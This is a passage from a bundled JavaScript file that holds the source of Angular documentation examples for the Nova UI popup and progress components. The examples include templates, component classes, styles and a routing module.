"./popup-different-directions.example.component.html",\n    encapsulation: ViewEncapsulation.None,\n})\nexport class PopupDifferentDirectionsExampleComponent {\n    public icon = "caret-down";\n    public itemsSource: string[] = [\n        $localize`Item 1`,\n        $localize`Item 2`,\n        $localize`Item 3`,\n        $localize`Item 4`,\n    ];\n\n    constructor() {}\n}\n'},51807:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    <code>&lt;nui-popup&gt;</code> is a base component for the most of\n    dropdown-like Nova components, but this doesn\'t limit it\'s abilities. It\n    allows you to put any HTML templates into it\'s body to build more complex\n    and exciting components.\n</p>\n<nui-message [allowDismiss]="false" type="warning">\n    <strong>Pay attention!</strong> The following examples demonstrate only\n    basic scenarios. To get familiar with more complex use cases, you can refer\n    to the documentation for components built on top of the\n    <code>nui-popup</code>, such as\n    <a href="../components/ComboboxComponent.html#example" target="_blank"\n        >nui-combobox</a\n    >,\n    <a href="../components/MenuComponent.html#example" target="_blank"\n        >nui-menu</a\n    >,\n    <a href="../components/SelectComponent.html#example" target="_blank"\n        >nui-select</a\n    >, etc., and explore their internal structure in the codebase.\n</nui-message>\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n<h2>Basic Usage</h2>\n<p>\n    A simple popup can be added to the page by adding a\n    <code>&lt;nui-popup&gt;</code> element. It must wrap two types of elements:\n    one that toggles the popup and one that defines the content. To achieve\n    this, the element responsible for toggling the popup must contain the\n    <code>nuiPopupToggle</code> directive. The area with the content must be\n    wrapped up inside a <code>div</code> with the\n    <code>popupAreaContent</code> directive assigned to it.\n</p>\n<nui-example-wrapper\n    filenamePrefix="popup-simple-usage"\n    exampleTitle="Basic Usage"\n>\n    <nui-popup-simple-usage-example></nui-popup-simple-usage-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Custom Width</h2>\n<p>\n    One can change the width of the popup by setting the\n    <code>width</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="popup-with-custom-width"\n    exampleTitle="Custom Width"\n>\n    <nui-popup-with-custom-width-example></nui-popup-with-custom-width-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Appended to Body</h2>\n<p>\n    <code>nui-popup</code> can be appended to the body of the page if required.\n    To achieve this, add the <code>appendToBody</code>\n    input to the component.\n</p>\n<nui-message [allowDismiss]="false" type="warning">\n    <strong>Please be aware</strong> that the positioning of the\n    <code>nui-popup</code> component is treated differently when the\n    <code>appendToBody</code> input is used. There is a technical limitation\n    that causes the <code>directionTop</code> and\n    <code>directionRight</code> inputs not to work when\n    <code>appendToBody</code> is true. In this case, the positioning of the\n    component is controlled exclusively by the\n    <code>edgeDetectionService</code>.\n</nui-message>\n<nui-example-wrapper\n    filenamePrefix="popup-append-to-body"\n    exampleTitle="Appended to Body"\n>\n    <nui-popup-append-to-body-example></nui-popup-append-to-body-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Custom Open Direction</h2>\n<p>\n    Even though <code>nui-popup</code> automatically detects the window edges\n    and adjusts the open direction accordingly thanks to the\n    <code>edgeDetectionService</code>, it\'s possible to force the\n    <code>nui-popup</code> to open in a specific direction. Available inputs\n    are: <code>directionRight</code> and <code>directionTop</code>, which\n    receive boolean values.\n</p>\n<nui-example-wrapper\n    filenamePrefix="popup-different-directions"\n    exampleTitle="Custom Open Direction"\n>\n    <nui-popup-different-directions-example></nui-popup-different-directions-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Custom Classes</h2>\n<p>\n    It is also easy to apply custom classes to the popup. Use the\n    <code>contextClass</code> input to pass the desired css class.\n</p>\n<nui-example-wrapper\n    filenamePrefix="popup-with-custom-styling"\n    exampleTitle="Custom Styling"\n>\n    <nui-popup-with-custom-styling-example></nui-popup-with-custom-styling-example>\n</nui-example-wrapper>\n\n\x3c!-- ------------------------------------------------------------------------------------------- --\x3e\n\n<h2>Custom Content</h2>\n<p>\n    You can put pretty much anything you want inside the\n    <code>nui-popup</code> component. You can use it to build more complex\n    components, and configure them to your liking.\n</p>\n<nui-example-wrapper\n    filenamePrefix="popup-with-custom-content"\n    exampleTitle="Custom Content"\n>\n    <nui-popup-with-custom-content-example></nui-popup-with-custom-content-example>\n</nui-example-wrapper>\n'},10215:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popup-docs-example",\n    templateUrl: "./popup-docs.example.component.html",\n})\nexport class PopupExampleComponent {}\n'},945:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popup>\n    <button\n        nui-button\n        nuiPopupToggle\n        type="button"\n        [icon]="icon"\n        [iconRight]="true"\n        class="menu-button"\n        [isEmpty]="false"\n        i18n\n    >\n        Click\n    </button>\n    <div popupAreaContent>\n        <ng-container *ngFor="let item of itemsSource">\n            <nui-menu-item tabindex="0" nuiTooltip="This icon is draggable">{{\n                item\n            }}</nui-menu-item>\n        </ng-container>\n    </div>\n</nui-popup>\n'},85213:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\n@Component({\n    selector: "nui-popup-simple-usage-example",\n    templateUrl: "./popup-simple-usage.example.component.html",\n    encapsulation: ViewEncapsulation.None,\n})\nexport class PopupSimpleExampleComponent {\n    public icon = "caret-down";\n    public itemsSource: string[] = [\n        $localize`Item 1`,\n        $localize`Item 2`,\n        $localize`Item 3`,\n        $localize`Item 4`,\n    ];\n}\n'},23905:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row mt-5">\n        <div class="col">\n            <p>Simple example</p>\n            <nui-popup id="nui-demo-popup-simple">\n                <button nuiPopupToggle>Click</button>\n                <div popupAreaContent>\n                    <ng-container *ngFor="let item of itemsSource">\n                        <nui-menu-item tabindex="0">{{ item }}</nui-menu-item>\n                    </ng-container>\n                </div>\n            </nui-popup>\n        </div>\n        <div class="col">\n            <p>Custom width</p>\n            <nui-popup [width]="width" id="nui-demo-popup-custom-width">\n                <button nuiPopupToggle>Click</button>\n                <div popupAreaContent>\n                    <ng-container *ngFor="let item of itemsSource">\n                        <nui-menu-item tabindex="0">{{ item }}</nui-menu-item>\n                    </ng-container>\n                </div>\n            </nui-popup>\n        </div>\n        <div class="col">\n            <p>Append to Body</p>\n            <nui-popup\n                [appendToBody]="true"\n                [directionRight]="true"\n                id="nui-demo-popup-append-to-body"\n                contextClass="additional-host-class"\n            >\n                <button nuiPopupToggle>Click</button>\n                <div popupAreaContent>\n                    <ng-container *ngFor="let item of itemsSource">\n                        <nui-menu-item tabindex="0">{{ item }}</nui-menu-item>\n                    </ng-container>\n                </div>\n            </nui-popup>\n        </div>\n    </div>\n    <div class="row mt-5">\n        <div class="col">\n            <p>Open Direction Right</p>\n            <nui-popup\n                [directionRight]="true"\n                id="nui-demo-popup-direction-right"\n            >\n                <button nuiPopupToggle>Click</button>\n                <div popupAreaContent>\n                    <ng-container *ngFor="let item of itemsSource">\n                        <nui-menu-item tabindex="0">{{ item }}</nui-menu-item>\n                    </ng-container>\n                </div>\n            </nui-popup>\n        </div>\n        <div class="col">\n            <p>Open Direction Top</p>\n            <nui-popup\n                [directionRight]="false"\n                [directionTop]="true"\n                id="nui-demo-popup-direction-top"\n            >\n                <button nuiPopupToggle>Click</button>\n                <div popupAreaContent>\n                    <ng-container *ngFor="let item of itemsSource">\n                        <nui-menu-item tabindex="0">{{ item }}</nui-menu-item>\n                    </ng-container>\n                </div>\n            </nui-popup>\n        </div>\n        <div class="col">\n            <p>IsOpen = true</p>\n            <nui-popup id="nui-demo-popup-isOpen-true" [isOpen]="true">\n                <button nuiPopupToggle>Click</button>\n                <div popupAreaContent>\n                    <ng-container *ngFor="let item of itemsSource">\n                        <nui-menu-item tabindex="0">{{ item }}</nui-menu-item>\n                    </ng-container>\n                </div>\n            </nui-popup>\n        </div>\n    </div>\n</div>\n'},16397:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// The following styles are used for demonstration purposes only\n.nui-demo-custom-class {\n    background-color: yellowgreen !important;\n    font-family: "Courier New", Courier, monospace;\n    font-weight: bold;\n    text-decoration: underline overline black dotted;\n    padding: 20px;\n}\n'},29677:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\n@Component({\n    selector: "nui-popup-test",\n    templateUrl: "./popup-test.example.component.html",\n    styleUrls: ["popup-test.example.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class PopupTestComponent {\n    public width = "200px";\n    public icon = "caret-down";\n    public itemsSource: string[] = [\n        "Item 1",\n        "Item 2",\n        "Item 3",\n        "Item 4",\n        "Item 5",\n    ];\n\n    public handleClick(event: MouseEvent): void {\n        event.stopPropagation();\n    }\n}\n'},68773:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="row top-buffer">\n    <div class="col-3 nui-text-default" i18n>Simple search bar</div>\n    <div class="col-3 nui-text-default" i18n>\n        Popover with Form and Checkbox Group Inside\n    </div>\n</div>\n<div class="row top-buffer">\n    <div class="col-3">\n        <nui-popup>\n            <button\n                nui-button\n                type="button"\n                nuiPopupToggle\n                icon="search"\n            ></button>\n            <div popupAreaContent>\n                <ng-container>\n                    <nui-search (click)="handleClick($event)"></nui-search>\n                </ng-container>\n            </div>\n        </nui-popup>\n    </div>\n    <div class="col-3">\n        <nui-popup\n            [width]="width"\n            contextClass="nui-demo-popover-custom-form-styles"\n        >\n            <a nuiPopupToggle i18n>More Options...</a>\n            <div popupAreaContent>\n                <ng-container>\n                    <form\n                        [formGroup]="demoFormGroup"\n                        (click)="handleClick($event)"\n                    >\n                        <div class="form-group">\n                            <nui-message\n                                [allowDismiss]="false"\n                                type="critical"\n                                *ngIf="\n                                    !demoFormGroup.controls[\'checkboxGroup\']\n                                        .valid &&\n                                    demoFormGroup.controls[\'checkboxGroup\']\n                                        .touched\n                                "\n                            >\n                                <b i18n>Select minimum 3 checkboxes!</b>\n                            </nui-message>\n                            <nui-checkbox-group\n                                formControlName="checkboxGroup"\n                                name="item"\n                                required\n                            >\n                                <nui-checkbox\n                                    *ngFor="let item of itemsSource"\n                                    [value]="item"\n                                >\n                                    {{ item }}\n                                </nui-checkbox>\n                            </nui-checkbox-group>\n                        </div>\n                        <button\n                            nui-button\n                            type="submit"\n                            [disabled]="\n                                demoFormGroup.controls[\'checkboxGroup\'].invalid\n                            "\n                            i18n\n                        >\n                            Submit\n                        </button>\n                    </form>\n                </ng-container>\n            </div>\n        </nui-popup>\n    </div>\n</div>\n'},30489:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-demo-popover-custom-form-styles {\n    padding: 20px;\n}\n\n.top-buffer {\n    margin-top: 5px;\n}\n\na[nuiPopupToggle] {\n    cursor: pointer;\n}\n"},92801:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\nimport { FormBuilder, Validators } from "@angular/forms";\n\n@Component({\n    selector: "nui-popup-with-custom-content-example",\n    templateUrl: "./popup-with-custom-content.example.component.html",\n    styleUrls: ["./popup-with-custom-content.example.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class PopupWithCustomContentComponent {\n    public icon = "caret-down";\n    public width = "200px";\n    public itemsSource: string[] = [\n        $localize`Item 1`,\n        $localize`Item 2`,\n        $localize`Item 3`,\n        $localize`Item 4`,\n    ];\n    public demoFormGroup;\n\n    constructor(private formBuilder: FormBuilder) {\n        this.demoFormGroup = this.formBuilder.group({\n            checkboxGroup: this.formBuilder.control(\n                [this.itemsSource[0], this.itemsSource[1], this.itemsSource[2]],\n                [Validators.required, Validators.minLength(3)]\n            ),\n        });\n    }\n\n    public handleClick(event: MouseEvent): void {\n        event.stopPropagation();\n    }\n}\n'},37417:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popup contextClass="nui-demo-custom-class">\n    <button\n        nui-button\n        nuiPopupToggle\n        width="90px"\n        type="button"\n        [icon]="icon"\n        [iconRight]="true"\n        class="menu-button"\n        [isEmpty]="false"\n        i18n\n    >\n        Click\n    </button>\n    <div popupAreaContent>\n        <ng-container *ngFor="let item of itemsSource">\n            <nui-menu-item tabindex="0">{{ item }}</nui-menu-item>\n        </ng-container>\n    </div>\n</nui-popup>\n'},71445:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// The following styles are used for demonstration purposes only\n\n.popup-adapter-overlay {\n    .nui-demo-custom-class.nui-overlay {\n        background-color: yellowgreen !important;\n        font-family: "Courier New", Courier, monospace;\n        font-weight: bold;\n        text-decoration: underline overline black dotted;\n        padding: 20px;\n    }\n}\n'},89349:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\n@Component({\n    selector: "nui-popup-with-custom-styling-example",\n    templateUrl: "./popup-with-custom-styling.example.component.html",\n    styleUrls: ["popup-with-custom-styling.example.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class PopupWithCustomStylingComponent {\n    public icon = "caret-down";\n    public itemsSource: string[] = [\n        $localize`Item 1`,\n        $localize`Item 2`,\n        $localize`Item 3`,\n        $localize`Item 4`,\n    ];\n\n    constructor() {}\n}\n'},36625:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popup [width]="width">\n    <button\n        nui-button\n        nuiPopupToggle\n        type="button"\n        [icon]="icon"\n        [iconRight]="true"\n        class="menu-button"\n        [isEmpty]="false"\n        i18n\n    >\n        Click\n    </button>\n    <div popupAreaContent>\n        <ng-container *ngFor="let item of itemsSource">\n            <nui-menu-item tabindex="0">{{ item }}</nui-menu-item>\n        </ng-container>\n    </div>\n</nui-popup>\n'},76125:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, ViewEncapsulation } from "@angular/core";\n\n@Component({\n    selector: "nui-popup-with-custom-width-example",\n    templateUrl: "./popup-with-custom-width.example.component.html",\n    encapsulation: ViewEncapsulation.None,\n})\nexport class PopupWithCustomWidthComponent {\n    public icon = "caret-down";\n    public width = "130px";\n    public itemsSource: string[] = [\n        $localize`Item 1`,\n        $localize`Item 2`,\n        $localize`Item 3`,\n        $localize`Item 4`,\n    ];\n\n    constructor() {}\n}\n'},61579:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCheckboxModule,\n    NuiDocsModule,\n    NuiMenuModule,\n    NuiMessageModule,\n    NuiPopupModule,\n    NuiSearchModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    PopupAppendToBodyExampleComponent,\n    PopupDifferentDirectionsExampleComponent,\n    PopupExampleComponent,\n    PopupSimpleExampleComponent,\n    PopupTestComponent,\n    PopupWithCustomContentComponent,\n    PopupWithCustomStylingComponent,\n    PopupWithCustomWidthComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: PopupExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.support,\n                eolDate: new Date("2020-07-09"),\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "popup-test",\n        component: PopupTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "basic",\n        component: PopupSimpleExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiPopupModule,\n        NuiMessageModule,\n        NuiButtonModule,\n        ReactiveFormsModule,\n        FormsModule,\n        NuiCheckboxModule,\n        NuiSearchModule,\n        NuiDocsModule,\n        NuiMenuModule,\n        RouterModule.forChild(routes),\n        NuiTextboxModule,\n    ],\n    declarations: [\n        PopupSimpleExampleComponent,\n        PopupDifferentDirectionsExampleComponent,\n        PopupWithCustomStylingComponent,\n        PopupWithCustomWidthComponent,\n        PopupWithCustomContentComponent,\n        PopupTestComponent,\n        PopupAppendToBodyExampleComponent,\n        PopupExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("popup"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class PopupModule {}\n'},26428:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-progress\n    id="nui-demo-basic-progress"\n    i18n-message\n    message="Task Label"\n    i18n-helpText\n    helpText="Optional description"\n    [show]="show"\n    [percent]="percent"\n>\n</nui-progress>\n\n<button\n    id="nui-demo-start-basic-progress"\n    nui-button\n    class="mt-1"\n    type="button"\n    (click)="startProgress()"\n    displayStyle="primary"\n    i18n\n>\n    Start progress\n</button>\n'},65228:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy } from "@angular/core";\n\n@Component({\n    selector: "nui-basic-progress-example",\n    templateUrl: "./basic-progress.example.component.html",\n})\nexport class BasicProgressExampleComponent implements OnDestroy {\n    public show = false;\n    public percent = 0;\n    public isCanceled = false;\n    private stop: any = undefined;\n\n    public startProgress(): void {\n        this.clearInterval();\n\n        this.show = true;\n        this.stop = setInterval(() => {\n            if (this.percent < 100) {\n                this.percent += 10;\n            } else {\n                this.onCancel();\n            }\n        }, 1000);\n    }\n\n    private onCancel() {\n        this.clearInterval();\n        this.isCanceled = true;\n        this.show = false;\n        this.stop = undefined;\n        this.percent = 0;\n    }\n\n    public ngOnDestroy(): void {\n        this.clearInterval();\n    }\n\n    private clearInterval() {\n        if (this.stop) {\n            clearInterval(this.stop);\n        }\n    }\n}\n'},82318:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-progress\n    id="nui-demo-indeterminate-progress"\n    [show]="show"\n    [allowCancel]="true"\n    i18n-message\n    message="Task Label"\n    i18n-helpText\n    helpText="Optional description"\n    (cancel)="onCancel()"\n>\n</nui-progress>\n\n<button\n    id="nui-demo-indeterminate-progress-btn"\n    nui-button\n    class="mt-1"\n    type="button"\n    (click)="startProgress()"\n    displayStyle="primary"\n    i18n\n>\n    Start progress\n</button>\n'},4554:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy } from "@angular/core";\n\n@Component({\n    selector: "nui-indeterminate-progress-example",\n    templateUrl: "./indeterminate-progress.example.component.html",\n})\nexport class IndeterminateProgressExampleComponent implements OnDestroy {\n    public show = false;\n    public isCanceled = false;\n    private stop: any = undefined;\n\n    public startProgress(): void {\n        this.clearInterval();\n        this.show = true;\n    }\n\n    public onCancel(): void {\n        this.clearInterval();\n        this.isCanceled = true;\n        this.show = false;\n        this.stop = undefined;\n    }\n\n    public ngOnDestroy(): void {\n        this.clearInterval();\n    }\n\n    private clearInterval() {\n        if (this.stop) {\n            clearInterval(this.stop);\n        }\n    }\n}\n'},99868:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, 